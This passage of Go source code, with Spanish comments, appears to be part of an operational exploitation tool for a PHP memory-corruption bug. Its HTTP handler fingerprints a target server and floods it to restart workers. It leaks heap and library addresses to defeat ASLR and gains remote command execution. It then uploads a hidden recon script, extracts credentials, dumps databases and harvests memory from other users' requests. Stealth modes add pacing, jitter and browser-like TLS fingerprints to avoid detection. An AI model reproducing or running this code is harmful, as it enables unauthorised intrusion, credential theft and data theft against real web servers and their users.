func p2sHarvest(t *p2sTarget, p p2sProfile, sessid string, passes int, seen map[string]bool) []byte {
	var all []byte
	for i := 0; i < passes; i++ {
		if t.ctx.Err() != nil {
			break
		}
		pp := p
		pp.Stage1N = p.Stage1N + (i%24)*2
		if _, lk := p2sLeakChunk(t, pp, sessid); len(lk) > 0 {
			k := fmt.Sprintf("%d:%s", len(lk), string(lk[:p2sMin(24, len(lk))]))
			if seen[k] {
				continue
			}
			seen[k] = true
			all = append(all, lk...)
			all = append(all, '\n')
		}
	}
	return all
}

/* ---------- handler NDJSON (streaming) ---------- */

func hExploit(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/x-ndjson; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")
	fl, _ := w.(http.Flusher)
	enc := json.NewEncoder(w)
	emit := func(e map[string]any) {
		enc.Encode(e)
		if fl != nil {
			fl.Flush()
		}
	}

	body := map[string]any{}
	if b, err := io.ReadAll(io.LimitReader(r.Body, 1<<20)); err == nil && len(bytes.TrimSpace(b)) > 0 {
		json.Unmarshal(b, &body)
	}

	target := strings.TrimSpace(str(body, "url"))
	cmd := firstNonEmpty(strings.TrimSpace(str(body, "cmd")), "id")
	profKey := strings.TrimSpace(str(body, "profile"))
	ua := strings.TrimSpace(str(body, "ua"))
	if ua == "" {
		ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
	}

	// --- nivel de sigilo ---
	mode := firstNonEmpty(strings.TrimSpace(str(body, "mode")), "discreto")
	if mode != "agresivo" && mode != "discreto" && mode != "fantasma" {
		mode = "discreto"
	}
	_, retriesGiven := body["retries"]
	_, harvestGiven := body["harvest"]
	_, postexGiven := body["postex"]

	intrusive := true
	if v, ok := body["intrusive"].(bool); ok {
		intrusive = v
	}
	keepalive, jitter := true, true
	if v, ok := body["keepalive"].(bool); ok {
		keepalive = v
	}
	if v, ok := body["jitter"].(bool); ok {
		jitter = v
	}

	delayMs, rotateFields, doPostex := 0, 3000, true
	runPhase0 := intrusive
	switch mode {
	case "agresivo":
		// sin pacing, todo a tope
	case "discreto":
		delayMs = 300
	case "fantasma":
		delayMs = 800
		rotateFields = 1200
		runPhase0 = false
		doPostex = false
	}
	if v, ok := body["delay_ms"].(float64); ok {
		delayMs = int(v)
	}
	if v, ok := body["rotate_fields"].(float64); ok && v > 0 {
		rotateFields = int(v)
	}
	retries, harvest := 8, 12
	if v, ok := body["retries"].(float64); ok && v >= 1 {
		retries = p2sMin(int(v), 40)
	}
	if v, ok := body["harvest"].(float64); ok && v >= 0 {
		harvest = p2sMin(int(v), 60)
	}
	if mode == "fantasma" {
		if !retriesGiven {
			retries = 6
		}
		if !harvestGiven {
			harvest = 6
		}
	}
	if postexGiven {
		if v, ok := body["postex"].(bool); ok {
			doPostex = v
		}
	}

	var custom []string
	if arr, ok := body["cmds"].([]any); ok {
		for _, x := range arr {
			if s := strings.TrimSpace(fmt.Sprint(x)); s != "" {
				custom = append(custom, s)
			}
		}
	}

	if target == "" {
		emit(map[string]any{"type": "error", "msg": "falta 'url'"})
		return
	}
	if !strings.Contains(target, "://") {
		target = "https://" + target
	}
	u, err := url.Parse(target)
	if err != nil || (u.Scheme != "http" && u.Scheme != "https") || u.Hostname() == "" {
		emit(map[string]any{"type": "error", "msg": "URL no válida"})
		return
	}
	path := u.EscapedPath()
	if path == "" {
		path = "/"
	}
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}

	// cabeceras base realistas (UA + Accept) y auth opcional
	baseHdr := "User-Agent: " + ua + "\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.9\r\n"
	if a := strings.TrimSpace(str(body, "auth")); a != "" {
		if strings.Contains(a, ":") && !strings.Contains(a, " ") {
			baseHdr += "Authorization: Basic " + base64.StdEncoding.EncodeToString([]byte(a)) + "\r\n"
		} else {
			baseHdr += "Authorization: " + a + "\r\n"
		}
	}

	start := time.Now()
	ctx := r.Context()
	t := &p2sTarget{ctx: ctx, hp: net.JoinHostPort(u.Hostname(), port), hostHeader: u.Hostname() + ":" + port,
		path: path, useTLS: u.Scheme == "https", sni: u.Hostname(),
		baseHdr: baseHdr, delay: time.Duration(delayMs) * time.Millisecond, jitter: jitter}
	if keepalive {
		t.pool = newP2sPool(2, func() (net.Conn, error) { return t.dial(10 * time.Second) })
	}

	notes := []string{}
	switch mode {
	case "discreto":
		notes = append(notes, "Modo discreto: randomización + pacing 300 ms, volumen COMPLETO (fuga y cosecha completas).")
	case "fantasma":
		notes = append(notes, "Modo fantasma: sin rotación de worker y menos volumen → más discreto pero MENOS fiable y menos datos.")
	}
	notes = append(notes, fmt.Sprintf("Transporte: %s · TLS tipo navegador (suites/curvas Chrome, sin GREASE → JA3 aproximado, no idéntico) · pacing %d ms%s",
		map[bool]string{true: "keep-alive (conexiones reutilizadas)", false: "Connection: close"}[keepalive],
		delayMs, map[bool]string{true: " ±33% jitter", false: ""}[jitter]))
	if keepalive {
		notes = append(notes, "Si el RCE deja de validar con keep-alive, desactívalo: la reutilización puede cambiar qué worker atiende la petición.")
	}

	emit(map[string]any{"type": "stage", "name": "Fingerprint PHP", "status": "run"})
	ver, markers, sapi := p2sFingerprintT(t)
	if ver == "" {
		emit(map[string]any{"type": "stage", "name": "Fingerprint PHP", "status": "skip", "detail": "sin versión en cabeceras · SAPI " + sapi})
	} else {
		emit(map[string]any{"type": "stage", "name": "Fingerprint PHP", "status": "done", "detail": "PHP " + ver + " · SAPI " + sapi})
	}
	vuln, vdetail := p2sVulnerable(ver)
	emit(map[string]any{"type": "log", "msg": "Evaluación: " + vdetail})
	emit(map[string]any{"type": "log", "msg": fmt.Sprintf("Transporte: keepalive=%v jitter=%v · JA3 aproximado (sin GREASE) · modo %s · rotación %d campos · reintentos %d · cosecha %d",
		keepalive, jitter, mode, rotateFields, retries, harvest)})

	if profKey == "" || profKey == "auto" {
		if strings.HasPrefix(ver, "8.3") {
			profKey = "official83"
		} else {
			profKey = "official"
		}
	}
	order := p2sProfileOrder(profKey)
	if v, ok := p2sParseHex(body["zif_offset"]); ok {
		order[0].ZifOffset = v
	}
	if v, ok := p2sParseHex(body["dtor_offset"]); ok {
		order[0].DtorOffset = v
	}
	if v, ok := p2sParseHex(body["htdata_offset"]); ok {
		order[0].HtdataOffset = v
	}
	prof := order[0]

	sessid := p2sRandStr(19) // sesión aleatoria (misma longitud → no altera el layout)
	var leakAll []byte
	leaks := map[string]string{}
	if sapi != "Apache" {
		notes = append(notes, "SAPI distinto de Apache/mod_php: la fuga puede ser menos fiable (PHP-FPM mata el worker al fallar el arranque).")
	}

	if runPhase0 {
		emit(map[string]any{"type": "stage", "name": "Fase 0 · Rotación de worker (OOM flood)", "status": "run"})
		p2sRotate(t, rotateFields)
		emit(map[string]any{"type": "stage", "name": "Fase 0 · Rotación de worker (OOM flood)", "status": "done", "detail": fmt.Sprintf("%d campos × 1KB → fatal OOM → worker reiniciado", rotateFields)})
		t.pace()
	} else {
		emit(map[string]any{"type": "stage", "name": "Fase 0 · Rotación de worker", "status": "skip", "detail": "omitida (fantasma)"})
	}

	var chunk, dtorAbs uint64
	emit(map[string]any{"type": "stage", "name": "Fase 1 · Fuga de la base del heap (Zend MM)", "status": "run"})
	for i := 0; i < retries && chunk == 0; i++ {
		if ctx.Err() != nil {
			break
		}
		if c, lk := p2sLeakChunk(t, prof, sessid); c != 0 {
			chunk = c
			if len(lk) > len(leakAll) {
				leakAll = lk
			}
		}
	}
	if chunk != 0 {
		leaks["chunk_base"] = fmt.Sprintf("0x%x", chunk)
		emit(map[string]any{"type": "leak", "kind": "chunk_base", "value": fmt.Sprintf("0x%x", chunk)})
		emit(map[string]any{"type": "stage", "name": "Fase 1 · Fuga de la base del heap (Zend MM)", "status": "done", "detail": fmt.Sprintf("chunk_base=0x%x", chunk)})
	} else {
		emit(map[string]any{"type": "stage", "name": "Fase 1 · Fuga de la base del heap (Zend MM)", "status": "fail", "detail": "sin fuga válida"})
	}

	if chunk != 0 {
		emit(map[string]any{"type": "stage", "name": "Fase 2 · Fuga de ZVAL_PTR_DTOR (libphp.so)", "status": "run"})
		for i := 0; i < retries && dtorAbs == 0; i++ {
			if ctx.Err() != nil {
				break
			}
			if d, lk := p2sLeakLibphp(t, prof, sessid); d > 0x700000000000 {
				dtorAbs = d
				if len(lk) > len(leakAll) {
					leakAll = lk
				}
			}
		}
		if dtorAbs != 0 {
			leaks["zval_ptr_dtor"] = fmt.Sprintf("0x%x", dtorAbs)
			emit(map[string]any{"type": "leak", "kind": "zval_ptr_dtor", "value": fmt.Sprintf("0x%x", dtorAbs)})
			emit(map[string]any{"type": "stage", "name": "Fase 2 · Fuga de ZVAL_PTR_DTOR (libphp.so)", "status": "done", "detail": fmt.Sprintf("dtor=0x%x", dtorAbs)})
		} else {
			emit(map[string]any{"type": "stage", "name": "Fase 2 · Fuga de ZVAL_PTR_DTOR (libphp.so)", "status": "fail", "detail": "sin fuga válida"})
		}
	} else {
		emit(map[string]any{"type": "stage", "name": "Fase 2 · Fuga de ZVAL_PTR_DTOR", "status": "skip", "detail": "depende de la fase 1"})
	}

	// Fase 3: auto-layout validado + RCE
	rceOK := false
	var rceOut string
	var htdata, zif uint64
	confirmed := ""
	if chunk != 0 && dtorAbs != 0 {
		emit(map[string]any{"type": "stage", "name": "Fase 3 · Auto-layout + RCE (centinela uid=)", "status": "run"})
		if p, h, z, ok := p2sConfirmLayout(t, sessid, chunk, dtorAbs, order, 3); ok {
			prof, htdata, zif, confirmed = p, h, z, p.Key
			leaks["libphp_base"] = fmt.Sprintf("0x%x", dtorAbs-p.DtorOffset)
			leaks["zif_system"] = fmt.Sprintf("0x%x", z)
			emit(map[string]any{"type": "leak", "kind": "layout", "value": p.Key + " (validado)"})
			if ok, out := p2sRunCmd(t, sessid, htdata, zif, cmd, retries+2, true); ok {
				rceOK, rceOut = true, out
			} else {
				rceOK, rceOut = true, "(layout validado; el comando no devolvió salida)"
			}
			emit(map[string]any{"type": "stage", "name": "Fase 3 · Auto-layout + RCE (centinela uid=)", "status": "done", "detail": "layout " + p.Key + " · RCE confirmado"})
		} else {
			emit(map[string]any{"type": "stage", "name": "Fase 3 · Auto-layout + RCE (centinela uid=)", "status": "fail", "detail": "ningún perfil validó (prueba offsets manuales)"})
		}
	} else {
		emit(map[string]any{"type": "stage", "name": "Fase 3 · RCE", "status": "skip", "detail": "faltan fugas de ASLR"})
	}

	// Post-explotación: script maestro subido (ilimitado) + comandos personalizados + BD
	var recon []map[string]string
	creds := map[string]string{}
	if rceOK && doPostex {
		emit(map[string]any{"type": "stage", "name": "Post-explotación · subir script maestro", "status": "run"})
		var allOut strings.Builder
		if okScript, out := p2sUploadAndRun(t, sessid, htdata, zif, p2sReconScript); okScript {
			recon = append(recon, map[string]string{"name": "recon maestro (script)", "cmd": "sh /tmp/.p2s (script subido)", "output": out})
			allOut.WriteString(out)
			emit(map[string]any{"type": "postex", "name": "recon maestro (script)", "cmd": fmt.Sprintf("script subido · %d B", len(p2sReconScript)), "output": out, "ok": true})
			emit(map[string]any{"type": "stage", "name": "Post-explotación · subir script maestro", "status": "done", "detail": "ejecutado"})
		} else {
			emit(map[string]any{"type": "stage", "name": "Post-explotación · subir script maestro", "status": "fail", "detail": "fallback a comandos cortos"})
			for _, rc := range p2sReconCmds {
				if ctx.Err() != nil {
					break
				}
				ok, o := p2sRunCmd(t, sessid, htdata, zif, rc.Cmd, 3, false)
				recon = append(recon, map[string]string{"name": rc.Name, "cmd": rc.Cmd, "output": o})
				allOut.WriteString(o)
				emit(map[string]any{"type": "postex", "name": rc.Name, "cmd": rc.Cmd, "output": o, "ok": ok})
			}
		}
		for _, c := range custom {
			if ctx.Err() != nil {
				break
			}
			ok, o := p2sRunSmart(t, sessid, htdata, zif, c, 3)
			recon = append(recon, map[string]string{"name": "personalizado", "cmd": c, "output": o})
			allOut.WriteString(o)
			emit(map[string]any{"type": "postex", "name": "personalizado", "cmd": c, "output": o, "ok": ok})
		}
		creds = p2sExtractCreds(allOut.String())
		if len(creds) > 0 {
			emit(map[string]any{"type": "creds", "creds": creds})
			if dbScript := p2sBuildDBScript(creds); dbScript != "" {
				emit(map[string]any{"type": "stage", "name": "Post-explotación · volcado de BD", "status": "run"})
				ok, o := p2sUploadAndRun(t, sessid, htdata, zif, dbScript)
				recon = append(recon, map[string]string{"name": "volcado BD", "cmd": "script BD subido", "output": o})
				emit(map[string]any{"type": "postex", "name": "volcado BD", "cmd": "script BD subido", "output": o, "ok": ok})
				emit(map[string]any{"type": "stage", "name": "Post-explotación · volcado de BD", "status": "done"})
			}
		}
		emit(map[string]any{"type": "stage", "name": "Post-explotación", "status": "done", "detail": fmt.Sprintf("%d salidas · %d creds", len(recon), len(creds))})
	} else if !rceOK {
		emit(map[string]any{"type": "stage", "name": "Post-explotación", "status": "skip", "detail": "sin RCE"})
	} else {
		emit(map[string]any{"type": "stage", "name": "Post-explotación", "status": "skip", "detail": "desactivada"})
	}

	// Cosecha de memoria: acumula fragmentos de varias peticiones/usuarios
	if harvest > 0 {
		emit(map[string]any{"type": "stage", "name": "Cosecha de memoria", "status": "run"})
		before := len(leakAll)
		leakAll = append(leakAll, p2sHarvest(t, prof, sessid, harvest, map[string]bool{})...)
		emit(map[string]any{"type": "stage", "name": "Cosecha de memoria", "status": "done", "detail": fmt.Sprintf("%d pasadas · +%d bytes (total %d)", harvest, len(leakAll)-before, len(leakAll))})
	}

	if !vuln && ver != "" {
		notes = append(notes, "Versión aparentemente PARCHEADA: si el worker vive desde antes del parche, reinícialo y repite.")
	}
	if confirmed != "" {
		notes = append(notes, "Layout confirmado por centinela uid= (perfil "+confirmed+").")
	}
	if len(leakAll) > 0 {
		notes = append(notes, fmt.Sprintf("Memoria acumulada: %d bytes.", len(leakAll)))
	}

	dump := p2sPrintable(leakAll)
	if len(dump) > 8000 {
		dump = dump[:8000] + "…"
	}
	secrets := p2sExtractSecrets(leakAll)

	emit(map[string]any{"type": "result", "result": map[string]any{
		"target": u.String(), "php_version": ver, "vulnerable": vuln, "verdict": vdetail,
		"sapi": sapi, "markers": markers, "mode": mode, "profile": confirmed, "profile_selected": profKey,
		"intrusive": intrusive, "keepalive": keepalive, "jitter": jitter,
		"leaks": leaks, "secrets": secrets, "memory_dump": dump,
		"memory_bytes": len(leakAll), "cmd": cmd, "rce_output": rceOut, "rce_success": rceOK,
		"recon": recon, "creds": creds, "harvest_passes": harvest, "requests": t.requests,
		"elapsed": fmt.Sprintf("%.1fs", time.Since(start).Seconds()), "notes": notes,
	}})
}

/* ===================== util ===================== */

// cleanHost normaliza dominio/URL/IP: quita esquema, ruta, puerto y corchetes IPv6.
func cleanHost(s string) string {
	s = strings.TrimSpace(strings.ToLower(s))
	if s == "" {
		return ""
	}
	if strings.Contains(s, "://") {
		if u, err := url.Parse(s); err == nil && u.Host != "" {
			return strings.TrimSuffix(u.Hostname(), ".")
		}
	}
	if net.ParseIP(strings.Trim(s, "[]")) != nil {
		return strings.Trim(s, "[]")
	}
	if i := strings.IndexAny(s, "/?#"); i >= 0 {
		s = s[:i]
	}
	if h, _, err := net.SplitHostPort(s); err == nil {
		s = h
	}
	return strings.TrimSuffix(strings.Trim(s, "[]"), ".")
}

func openBrowser(url string) {
	time.Sleep(600 * time.Millisecond)
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("rundll32", "url.dll,FileProtocolHandler", url)
	case "darwin":
		cmd = exec.Command("open", url)
	default:
		cmd = exec.Command("xdg-open", url)
	}
	cmd.Start()
}